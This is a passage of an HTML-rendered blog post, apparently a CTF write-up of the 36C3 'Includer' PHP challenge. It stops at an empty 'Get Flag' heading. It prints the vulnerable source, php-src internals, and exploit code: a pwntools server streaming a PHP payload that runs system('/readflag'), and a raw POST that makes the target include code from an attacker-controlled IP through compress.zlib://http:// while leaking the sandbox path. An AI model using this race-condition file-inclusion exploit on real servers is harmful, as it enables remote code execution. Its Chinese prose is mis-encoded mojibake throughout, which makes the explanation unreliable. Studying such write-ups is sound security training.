        <span class=na>data-parsley-error-message</span><span class=o>=</span><span class=s>&#39;&lt;input type=&#34;input&#34; name=&#34;id&#34; value=&#34;0000000000000000&#34;&gt;&#39;</span>
        <span class=na>value</span><span class=o>=</span><span class=s>&#39;a[href^=&#34;/show.php?id=GUESS&#34;]&#39;</span>
        <span class=na>autofocus</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</code></pre></div><h2 id=includer>Includer</h2>
<blockquote>
<p><strong>Difficulty estimate</strong>: medium</p>
<p><strong>Solved</strong>:9/321</p>
<p><strong>Points</strong>: round(1000 Â· min(1, 10 / (9 + [9 solves]))) = <strong>556</strong> points</p>
<p><strong>Description:</strong></p>
<p>Just sitting here and waiting for PHP 8.0 (lolphp).</p>
<p><strong>Download:</strong></p>
<p><a class=link href=https://github.com/ZeddYu/36c3-CTF-Web/blob/master/includer/includer-df39401c4c1c28ab.tar.xz target=_blank rel=noopener>includer-df39401c4c1c28ab.tar.xz (3.5 KiB)</a></p>
</blockquote>
<p>é¢˜ç›®ç»™å‡ºæºä»£ç ä»¥åŠéƒ¨ç½²æ–‡ä»¶ï¼Œæºä»£ç å¦‚ä¸‹ï¼š</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>declare</span><span class=p>(</span><span class=nx>strict_types</span><span class=o>=</span><span class=mi>1</span><span class=p>);</span>

<span class=nv>$rand_dir</span> <span class=o>=</span> <span class=s1>&#39;files/&#39;</span><span class=o>.</span><span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>32</span><span class=p>));</span>
<span class=nx>mkdir</span><span class=p>(</span><span class=nv>$rand_dir</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;mkdir&#39;</span><span class=p>);</span>
<span class=nx>putenv</span><span class=p>(</span><span class=s1>&#39;TMPDIR=&#39;</span><span class=o>.</span><span class=no>__DIR__</span><span class=o>.</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$rand_dir</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;putenv&#39;</span><span class=p>);</span>
<span class=k>echo</span> <span class=s1>&#39;Hello &#39;</span><span class=o>.</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39; your sandbox: &#39;</span><span class=o>.</span><span class=nv>$rand_dir</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>

<span class=k>try</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]),</span> <span class=s1>&#39;&lt;?&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>include_once</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]);</span>
    <span class=p>}</span>
<span class=p>}</span>
<span class=k>finally</span> <span class=p>{</span>
    <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;rm -rf &#39;</span><span class=o>.</span><span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$rand_dir</span><span class=p>));</span>
<span class=p>}</span>
</code></pre></div><h3 id=configuration-error>Configuration Error</h3>
<p>å…¶ä¸­é…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„é…ç½®é”™è¯¯ï¼š</p>
<pre tabindex=0><code class=language-config data-lang=config>location /.well-known {
  autoindex on;
  alias /var/www/html/well-known/;
}
</code></pre><p>å¼€å¯äº†åˆ—ç›®å½•å¹¶ä¸”æˆ‘ä»¬å¯ä»¥éå†åˆ°ä¸Šå±‚æ–‡ä»¶å¤¹ã€‚</p>
<h3 id=upload-arbitrary-data>Upload Arbitrary Data</h3>
<p>ä¸€å¼€å§‹æˆ‘çœ‹åˆ°è¿™ä¸ªæ²¡æœ‰<code>&lt;?</code>çš„å½¢å¼ï¼Œæˆ‘æƒ³åˆ°çš„æ˜¯pç‰›åšå®¢é‡Œé¢æœ‰å…³æ­»äº¡ exit çš„å†…å®¹ï¼Œ<a class=link href=https://www.leavesongs.com/PENETRATION/php-filter-magic.html target=_blank rel=noopener>è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a>ï¼Œå¥ˆä½•åŸæ–‡ç”¨çš„æ˜¯<code>file_put_content</code>ï¼Œæˆ‘ä»¬è¿™é‡Œç”¨çš„æ˜¯<code>file_get_contents</code>ï¼Œå¹¶ä¸”è¿™é‡Œçš„åˆ¤æ–­ä¹Ÿåœ¨ä½¿ç”¨äº†<code>file_get_contents</code>å‡½æ•°ä¹‹åè¿›è¡Œåˆ¤æ–­æ˜¯å¦æœ‰<code>&lt;?</code>ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç¼–ç ç»•è¿‡å°±ä¸å¤ªå¯èƒ½äº†ã€‚</p>
<p>è€Œä¸”è¿™é‡Œæœ€å¥‡æ€ªçš„å°±æ˜¯ä¹‹å‰ç”¨äº†ä¸€äº›çœ‹ä¼¼æ— å…³ç´§è¦çš„ä»£ç ï¼Œæ¯”å¦‚ä½¿ç”¨äº†<code>putenv()</code>å‡½æ•°ç­‰ï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ª sandbox ï¼Œç„¶è€Œæˆ‘ä»¬ä¼¼ä¹æ— æ³•åˆ©ç”¨è¡¨é¢çš„ä»£ç è¿›è¡Œæ–‡ä»¶ä¸Šä¼ å•¥çš„æ“ä½œã€‚</p>
<p>balsn é˜Ÿä¼åœ¨å…¬å¼€çš„ wp ä¸­å†™äº†æ¯”è¾ƒè¯¦ç»†çš„æºç åˆ†æï¼Œè¿™é‡Œæˆ‘å°±é…åˆå…¶ä¸­çš„ wp è¿›è¡Œä¸€ä¸‹ç®€å•çš„åˆ†æã€‚</p>
<p>é¦–å…ˆç›´æ¥ç»™å‡ºç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>compress.zip://</code>æµè¿›è¡Œä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œæ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹ç›¸å…³åŸç†ã€‚</p>
<p>åœ¨ <a class=link href=https://github.com/php/php-src target=_blank rel=noopener>php-src</a> æºä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¯¥æµçš„ç›¸å…³è§¦å‘è§£æå‡½æ•°<code>php_stream_gzopen</code></p>
<p>ext/zlib/zlib_fopen_wrapper.c</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>php_stream</span> <span class=o>*</span><span class=nf>php_stream_gzopen</span><span class=p>(</span><span class=n>php_stream_wrapper</span> <span class=o>*</span><span class=n>wrapper</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>mode</span><span class=p>,</span> <span class=kt>int</span> <span class=n>options</span><span class=p>,</span>
							  <span class=n>zend_string</span> <span class=o>**</span><span class=n>opened_path</span><span class=p>,</span> <span class=n>php_stream_context</span> <span class=o>*</span><span class=n>context</span> <span class=n>STREAMS_DC</span><span class=p>)</span>
<span class=p>{</span>
	<span class=p>...</span>
	<span class=k>if</span> <span class=p>(</span><span class=n>strncasecmp</span><span class=p>(</span><span class=s>&#34;compress.zlib://&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
		<span class=n>path</span> <span class=o>+=</span> <span class=mi>16</span><span class=p>;</span>
	<span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>strncasecmp</span><span class=p>(</span><span class=s>&#34;zlib:&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=mi>5</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
		<span class=n>path</span> <span class=o>+=</span> <span class=mi>5</span><span class=p>;</span>
	<span class=p>}</span>

	<span class=n>innerstream</span> <span class=o>=</span> <span class=n>php_stream_open_wrapper_ex</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>mode</span><span class=p>,</span> <span class=n>STREAM_MUST_SEEK</span> <span class=o>|</span> <span class=n>options</span> <span class=o>|</span> <span class=n>STREAM_WILL_CAST</span><span class=p>,</span> <span class=n>opened_path</span><span class=p>,</span> <span class=n>context</span><span class=p>);</span>
	<span class=p>...</span>
	<span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ ‡å¿—ä½<code>STREAM_WILL_CAST</code>ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸ªæ ‡å¿—ä½ç”¨æ¥å¹²å˜›ï¼Œåœ¨<code>main/php_streams.h</code>å®šä¹‰äº†è¯¥æ ‡å¿—ä½:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cm>/* If you are going to end up casting the stream into a FILE* or
</span><span class=cm> * a socket, pass this flag and the streams/wrappers will not use
</span><span class=cm> * buffering mechanisms while reading the headers, so that HTTP
</span><span class=cm> * wrapped streams will work consistently.
</span><span class=cm> * If you omit this flag, streams will use buffering and should end
</span><span class=cm> * up working more optimally.
</span><span class=cm> * */</span>
<span class=cp>#define STREAM_WILL_CAST                0x00000020
</span></code></pre></div><p>å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨æ¥å°† stream è½¬æ¢æˆ FILE* çš„æ ‡å¿—ä½ï¼Œåœ¨è¿™é‡Œå°±ä¸æˆ‘ä»¬åˆ›å»ºä¸´æ—¶æ–‡ä»¶æœ‰å…³äº†ã€‚</p>
<p>æ¥ç€æˆ‘ä»¬è·Ÿè¿›<code>php_stream_open_wrapper_ex</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨<code>main/php_streams.h</code>ä¸­è¢« define ä¸º<code>_php_stream_open_wrapper_ex</code>ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>PHPAPI</span> <span class=n>php_stream</span> <span class=o>*</span><span class=nf>_php_stream_open_wrapper_ex</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>mode</span><span class=p>,</span> <span class=kt>int</span> <span class=n>options</span><span class=p>,</span>
		<span class=n>zend_string</span> <span class=o>**</span><span class=n>opened_path</span><span class=p>,</span> <span class=n>php_stream_context</span> <span class=o>*</span><span class=n>context</span> <span class=n>STREAMS_DC</span><span class=p>)</span>
<span class=p>{</span>
	<span class=c1>//...
</span><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=n>stream</span> <span class=o>!=</span> <span class=nb>NULL</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>options</span> <span class=o>&amp;</span> <span class=n>STREAM_MUST_SEEK</span><span class=p>))</span> <span class=p>{</span>
		<span class=n>php_stream</span> <span class=o>*</span><span class=n>newstream</span><span class=p>;</span>

		<span class=k>switch</span><span class=p>(</span><span class=n>php_stream_make_seekable_rel</span><span class=p>(</span><span class=n>stream</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>newstream</span><span class=p>,</span>
					<span class=p>(</span><span class=n>options</span> <span class=o>&amp;</span> <span class=n>STREAM_WILL_CAST</span><span class=p>)</span>
						<span class=o>?</span> <span class=nl>PHP_STREAM_PREFER_STDIO</span> <span class=p>:</span> <span class=n>PHP_STREAM_NO_PREFERENCE</span><span class=p>))</span>
  <span class=c1>//...
</span><span class=c1></span>	<span class=k>return</span> <span class=n>stream</span><span class=p>;</span>
<span class=p>}</span>
<span class=cm>/* }}} */</span>
</code></pre></div><p>è¯¥å‡½æ•°è°ƒç”¨äº†<code>php_stream_make_seekable_rel</code>ï¼Œå¹¶å‘å…¶ä¸­ä¼ å…¥äº†<code>STREAM_WILL_CAST</code>å‚æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›<code>php_stream_make_seekable_rel</code>å‡½æ•°ï¼Œå®ƒåœ¨<code>main/php_streams.h</code>ä¸­è¢« define ä¸º<code>_php_stream_make_seekable</code>ï¼Œç»§ç»­è·Ÿè¿›</p>
<p>main/streams/cast.c</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cm>/* {{{ php_stream_make_seekable */</span>
<span class=n>PHPAPI</span> <span class=kt>int</span> <span class=nf>_php_stream_make_seekable</span><span class=p>(</span><span class=n>php_stream</span> <span class=o>*</span><span class=n>origstream</span><span class=p>,</span> <span class=n>php_stream</span> <span class=o>**</span><span class=n>newstream</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span> <span class=n>STREAMS_DC</span><span class=p>)</span>
<span class=p>{</span>
	<span class=k>if</span> <span class=p>(</span><span class=n>newstream</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
		<span class=k>return</span> <span class=n>PHP_STREAM_FAILED</span><span class=p>;</span>
	<span class=p>}</span>
	<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>

	<span class=k>if</span> <span class=p>(((</span><span class=n>flags</span> <span class=o>&amp;</span> <span class=n>PHP_STREAM_FORCE_CONVERSION</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>origstream</span><span class=o>-&gt;</span><span class=n>ops</span><span class=o>-&gt;</span><span class=n>seek</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
		<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=n>origstream</span><span class=p>;</span>
		<span class=k>return</span> <span class=n>PHP_STREAM_UNCHANGED</span><span class=p>;</span>
	<span class=p>}</span>

	<span class=cm>/* Use a tmpfile and copy the old streams contents into it */</span>

	<span class=k>if</span> <span class=p>(</span><span class=n>flags</span> <span class=o>&amp;</span> <span class=n>PHP_STREAM_PREFER_STDIO</span><span class=p>)</span> <span class=p>{</span>
		<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=n>php_stream_fopen_tmpfile</span><span class=p>();</span>
	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
		<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=n>php_stream_temp_new</span><span class=p>();</span>
	<span class=p>}</span>
	<span class=c1>//...
</span><span class=c1></span><span class=p>}</span>
<span class=cm>/* }}} */</span>
</code></pre></div><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœ<code>flags</code>ä¸<code>PHP_STREAM_PREFER_STDIO</code>éƒ½è¢«è®¾ç½®çš„è¯ï¼Œè€Œ<code>PHP_STREAM_PREFER_STDIO</code>åœ¨ main/php_streams.h ä¸­å·²ç»è¢« define</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#define PHP_STREAM_PREFER_STDIO		1
</span></code></pre></div><p>æˆ‘ä»¬åªéœ€è¦å…³å¿ƒ flags çš„å€¼å°±å¥½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®å®š flags çš„å€¼éé›¶å³å¯ï¼Œæ ¹æ®å‰é¢çš„è·Ÿè¿›æˆ‘ä»¬æ˜“çŸ¥ flags çš„åœ¨è¿™é‡Œéé›¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è°ƒç”¨äº†<code>php_stream_fopen_tmpfile</code>å‡½æ•°åˆ›å»ºäº†ä¸´æ—¶æ–‡ä»¶ã€‚</p>
<p>äºæ˜¯æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªç®€å•çš„éªŒè¯ï¼Œåœ¨æœ¬æœºä¸Šè·‘æºä»£ç ï¼Œå¹¶ç”¨ pwntools èµ·ä¸€ä¸ªæœåŠ¡ç”¨æ¥å‘é€ä¸€ä¸ªå¤§æ–‡ä»¶</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=kn>import</span> <span class=nn>requests</span>
<span class=kn>import</span> <span class=nn>re</span>
<span class=kn>import</span> <span class=nn>threading</span>
<span class=kn>import</span> <span class=nn>time</span>


<span class=k>def</span> <span class=nf>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
    <span class=n>l</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;</span><span class=si>{}</span><span class=se>\r</span><span class=s1>
</span><span class=s1></span><span class=si>{}</span><span class=se>\r</span><span class=s1>
</span><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))[</span><span class=mi>2</span><span class=p>:],</span> <span class=n>data</span><span class=p>))</span>

<span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
    <span class=n>l</span> <span class=o>=</span> <span class=n>listen</span><span class=p>(</span><span class=mi>9999</span><span class=p>)</span>
    <span class=n>l</span><span class=o>.</span><span class=n>wait_for_connection</span><span class=p>()</span>

    <span class=n>data1</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;X&#39;</span><span class=p>)</span>
    <span class=n>data2</span> <span class=o>=</span> <span class=s1>&#39;&lt;?php system(&#34;/readflag&#34;); exit(); /*&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span><span class=p>)</span>
    <span class=n>data3</span> <span class=o>=</span> <span class=s1>&#39;c*/&#39;</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;c&#39;</span><span class=p>)</span>

    <span class=n>l</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\r\n\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>l</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;HTTP/1.1 200 OK</span><span class=se>\r</span><span class=s1>
</span><span class=s1>Content-Type: exploit/revxakep</span><span class=se>\r</span><span class=s1>
</span><span class=s1>Connection: close</span><span class=se>\r</span><span class=s1>
</span><span class=s1>Transfer-Encoding: chunked</span><span class=se>\r</span><span class=s1>
</span><span class=s1></span><span class=se>\r</span><span class=s1>
</span><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>

    <span class=n>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data1</span><span class=p>)</span>

    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;waiting...&#39;</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;sending php code...&#39;</span><span class=p>)</span>

    <span class=n>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data2</span><span class=p>)</span>

    <span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>

    <span class=n>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data3</span><span class=p>)</span>

    <span class=n>l</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;0</span><span class=se>\r</span><span class=s1>
</span><span class=s1></span><span class=se>\r</span><span class=s1>
</span><span class=s1></span><span class=se>\r</span><span class=s1>
</span><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>
    <span class=n>l</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</code></pre></div><p>è¿™æ ·æˆ‘åœ¨æœ¬æœºä¸Šç”¨ fswatch å¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°ä¸´æ—¶æ–‡ä»¶å·²ç»ç”Ÿæˆï¼Œå¹¶ä¸”æ–‡ä»¶å†…å®¹å°±æ˜¯æˆ‘ä»¬å‘é€çš„å†…å®¹ã€‚</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png loading=lazy>
</a>
</figure></p>
<h3 id=keep-temp-file>Keep Temp File</h3>
<p>ä¸´æ—¶æ–‡ä»¶ç»ˆç©¶è¿˜æ˜¯ä¼šè¢« php åˆ é™¤æ‰çš„ï¼Œå¦‚æœæˆ‘ä»¬è¦è¿›è¡ŒåŒ…å«çš„è¯ï¼Œå°±éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è®©ä¸´æ—¶æ–‡ä»¶å°½å¯èƒ½ä¹…çš„ç•™å­˜åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬æ‰æœ‰æœºä¼šå»åŒ…å«å®ƒã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œæ˜¯æˆ‘ä»¬éœ€è¦ç«äº‰çš„ç¬¬ä¸€ä¸ªç‚¹ï¼ŒåŸºæœ¬ä¸Šæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•è®©å®ƒåœç•™æ¯”è¾ƒä¹…çš„æ—¶é—´ï¼š</p>
<ul>
<li>ä½¿ç”¨å¤§æ–‡ä»¶ä¼ è¾“ï¼Œè¿™æ ·åœ¨ä¼ è¾“çš„æ—¶å€™å°±ä¼šæœ‰ä¸€å®šçš„æ—¶é—´è®©æˆ‘ä»¬åŒ…å«åˆ°æ–‡ä»¶äº†ã€‚</li>
<li>ä½¿ç”¨ FTP é€Ÿåº¦æ§åˆ¶ï¼Œå¤§æ–‡ä»¶ä¼ è¾“æ ¹æœ¬ä¸Šè¿˜æ˜¯ä¼ è¾“é€Ÿåº¦çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹å¼é™åˆ¶ä¼ è¾“é€Ÿç‡ï¼Œæ¯”è¾ƒç®€å•çš„ä¹Ÿå¯ä»¥åˆ©ç”¨<code>compress.zlib://ftp://</code>å½¢å¼ï¼Œæ§åˆ¶ FTP é€Ÿåº¦å³å¯</li>
</ul>
<h3 id=bypass-waf>Bypass Waf</h3>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦çœ‹å¦‚ä½•æ¥å¯¹å…³é”®åœ°æ–¹è¿›è¡Œç»•è¿‡äº†ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php>    <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]),</span> <span class=s1>&#39;&lt;?&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>include_once</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]);</span>
    <span class=p>}</span>
</code></pre></div><p>è¿™ä¸ªåœ°æ–¹é—®äº†å¾ˆå¤šå¸ˆå‚…ï¼ŒåŒ…æ‹¬ä¸€è¡€çš„ TokyoWesterns çš„é˜Ÿå‘˜ä»¥åŠå‚è€ƒäº†ä¸»è¦çš„å…¬å¼€ WPï¼ŒåŸºæœ¬éƒ½æ˜¯åˆ©ç”¨ä¸¤ä¸ªå‡½æ•°ä¹‹é—´æç«¯çš„æ—¶é—´çª—è¿›è¡Œç»•è¿‡ã€‚</p>
<p>ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æå…¶ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå·±çš„æœåŠ¡å…ˆå‘é€ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œè¿™æ—¶å€™é€šè¿‡<code>stripos</code>çš„åˆ¤æ–­å°±æ˜¯æ²¡æœ‰ PHP ä»£ç çš„æ–‡ä»¶æ•°æ®ï¼Œæ¥ç€æˆ‘ä»¬åˆ©ç”¨ HTTP é•¿é“¾æ¥çš„å½¢å¼ï¼Œåªè¦è¿™ä¸ªé“¾æ¥ä¸æ–­å¼€ï¼Œåœ¨æˆ‘ä»¬ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘é€ç¬¬äºŒæ®µå«æœ‰ PHP ä»£ç çš„æ•°æ®äº†ï¼Œè¿™æ ·å°±èƒ½ä½¿<code>include_once</code>åŒ…å«æˆ‘ä»¬çš„ä»£ç äº†ã€‚</p>
<p>å› ä¸ºæˆ‘ä»¬æ— æ³•çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ–¹æ³•åªèƒ½åˆ©ç”¨ç«äº‰çš„å½¢å¼å»åŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯ç¬¬äºŒä¸ªæˆ‘ä»¬éœ€è¦ç«äº‰çš„ç‚¹ã€‚</p>
<h3 id=leak-dir-path>Leak Dir path</h3>
<p>æœ€åï¼Œè¦åšåˆ°æ–‡ä»¶åŒ…å«ï¼Œè‡ªç„¶å¾—å…ˆçŸ¥é“å®ƒçš„æ–‡ä»¶è·¯å¾„ï¼Œè€Œæ–‡ä»¶è·¯å¾„æ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆä¸å¾—ä¸é€šè¿‡æŸäº›æ–¹å¼å»è·å–è·¯å¾„ã€‚</p>
<p>è™½ç„¶æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹åˆ°é¢˜ç›®æ˜¯ç›´æ¥ç»™å‡ºäº†è·¯å¾„ï¼Œä½†æ˜¯ä¹ä¸€çœ‹ä»£ç æˆ‘ä»¬è²Œä¼¼åªèƒ½ç­‰åˆ°å…¨éƒ¨å‡½æ•°ç»“æŸä¹‹åæ‰èƒ½æ‹¿åˆ°è·¯å¾„ï¼Œç„¶è€Œä¹‹å‰æˆ‘ä»¬è¯´åˆ°çš„éœ€è¦ä¿ç•™çš„é•¿é“¾æ¥ä¸èƒ½è®©æˆ‘ä»¬ç«‹å³å¾—åˆ°æˆ‘ä»¬çš„ sandbox è·¯å¾„ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ä¼ å…¥è¿‡å¤§çš„ name å‚æ•°ï¼Œå¯¼è‡´ PHP output buffer æº¢å‡ºï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„ï¼Œå‚è€ƒä»£ç ï¼š</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python>    <span class=n>data</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;file=compress.zlib://http://192.168.151.132:8080&amp;name=&#39;&#39;&#39;</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=o>+</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>7</span> <span class=o>+</span> <span class=mi>882</span><span class=p>)</span>
    <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;POST / HTTP/1.1</span><span class=se>\r</span><span class=s1>
</span><span class=s1>Host: localhost</span><span class=se>\r</span><span class=s1>
</span><span class=s1>Connection: close</span><span class=se>\r</span><span class=s1>
</span><span class=s1>Content-Length: </span><span class=si>{}</span><span class=se>\r</span><span class=s1>
</span><span class=s1>Content-Type: application/x-www-form-urlencoded</span><span class=se>\r</span><span class=s1>
</span><span class=s1>Cookie: PHPSESSID=asdasdasd</span><span class=se>\r</span><span class=s1>
</span><span class=s1></span><span class=se>\r</span><span class=s1>
</span><span class=s1></span><span class=si>{}</span><span class=se>\r</span><span class=s1>
</span><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>),</span> <span class=n>data</span><span class=p>))</span>
</code></pre></div><h3 id=get-flag>Get Flag</h3>
